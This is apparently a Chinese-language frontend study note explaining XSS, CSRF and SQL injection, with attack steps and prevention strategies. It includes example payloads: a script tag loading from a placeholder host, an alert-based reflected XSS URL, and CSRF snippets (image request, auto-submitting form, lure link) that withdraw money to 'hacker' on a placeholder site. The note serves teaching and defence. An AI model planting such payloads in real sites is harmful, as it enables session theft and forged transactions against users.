# 常见的web攻击

https://github.com/LuckyWinty/fe-weekly-questions/issues/1

[web 应用常见安全漏洞一览](https://segmentfault.com/a/1190000018004657)


## XSS（Cross-Site Scripting，跨站脚本攻击）
[前端安全系列 | XSS](https://juejin.im/post/6844903928551702541)
[前端安全系列（一）：如何防止XSS攻击？](https://juejin.im/post/6844903685122703367)

### 概念
XSS 是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。

为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。

### 分类
* Stored XSS（存储型 XSS 攻击）
* Reflected XSS（反射型 XSS 攻击）
* DOM XSS
* JSONP XSS

|类型|存储区|插入点
|:--|:--|:--
| Reflected XSS | URL | HTML
| Stored XSS| 后端数据库| HTML
| DOM XSS| 后端数据库 / 前端存储 / URL|  JavaScript


### 存储型 XSS 攻击

存储型 XSS 的攻击，通过提交带有恶意脚本的内容存储在服务器上，当其他人看到这些内容时发起 Web 攻击。一般提交的内容都是通过一些富文本编辑器编辑的，很容易插入危险代码。

存储型 XSS 的攻击步骤：

* 攻击者将恶意代码（比如在input, textarea等所有可能输入文本信息的区域，输入\<script src="http://xxx"></script>等）提交到目标网站的数据库中。

* 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。

* 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。

* 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

### 反射型 XSS 攻击

反射型的 XSS 攻击，主要是由于服务端接收到客户端的不安全输入，在客户端触发执行从而发起 Web 攻击。

反射型 XSS 的攻击步骤：

* 攻击者构造出特殊的 URL（http://xxx.com?query=\<script>alert("你受到了XSS攻击")\</script>

复制代码），其中包含恶意代码。

* 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。

* 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。

* 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。

反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。

反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。
由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。

POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。


### DOM 型 XSS
DOM 型 XSS 的攻击步骤：

* 攻击者构造出特殊的 URL，其中包含恶意代码。

* 用户打开带有恶意代码的 URL。

* 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。

* 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口* 执行攻击者指定的操作。

DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。


### 预防策略：
* 验证用户输入:
对于用户的任何输入要进行检查、过滤和转义。建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码

* 过滤:
移除用户上传的DOM属性，如onerror等
移除用户上传的Style节点、Script节点、Iframe节点等

* 校正:
避免直接对HTML Entity解码
使用DOM Parse转换，校正不配对的DOM标签



### JSONP XSS
JSONP 的 callback 参数非常危险，他有两种风险可能导致 XSS：
* callback 参数意外截断 js 代码，特殊字符单引号双引号，换行符均存在风险。
* callback 参数恶意添加标签（如


### -
```js
npm install xss --save

let xss = reauire('xss')  
console.log(xss('<a onclick="alert(xss)"></a>'))
```

## CSRF（Cross-Site Request Forgeries，跨站点请求伪造）
[](https://juejin.im/post/6844903928555896839)

### 概念
引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。
![CSFR](/img/CSFR.png)


与 XSS 相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。

### 分类
* GET类型的CSRF
* POST类型的CSRF
* 链接类型的CSRF

### GET类型的CSRF
这类攻击非常简单，只需要一个HTTP请求：
```html
 <img src="http://a.com/withdraw?amount=10000&for=hacker" > 
```
在受害者访问含有这个 img 的页面后，浏览器会自动向 a.com 发出一次HTTP请求。a.com 就会收到包含受害者登录信息的一次跨域请求

### POST类型的CSRF
利用起来通常使用的是一个自动提交的表单，如：
```html
<form action="http://a.com/withdraw" method=POST>
  <input type="hidden" name="account" value="airing" />
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="for" value="hacker" />
</form>
<script> document.forms[0].submit(); </script> 
```

访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。可见这种类型的 CSRF 与第一种一样，都是模拟请求，所以后端接口也不能将安全寄托在仅允许 POST 请求上。

### 链接类型的CSRF

需要用户点击链接才会触发，但本质上与前两种一样。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：
```html
<a href="http://a.com/withdraw.php?amount=1000&for=hacker" taget="_blank">
屠龙宝刀，点击就送！ 一刀9999999！是兄弟就来砍我！！！
<a/>
```
由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个页面，则表示攻击成功。

### 预防策略：
* token验证机制，比如请求数据字段中添加一个token，响应请求时校验其有效性  
* 用户操作限制，比如验证码
* 请求来源限制，比如限制HTTP Referer才能完成操作（防御效果相比较差）

## SQL注入攻击
### 概念
SQL 注入就是通过给 web 应用接口传入一些特殊字符，欺骗服务器执行恶意的 SQL 命令。

### 预防策略：

* 禁止目标网站利用动态拼接字符串的方式访问数据库
* 减少不必要的数据库抛出的错误信息
* 对数据库的操作赋予严格的权限控制
* 净化和过滤掉不必要的SQL保留字，比如：where, or, exec 等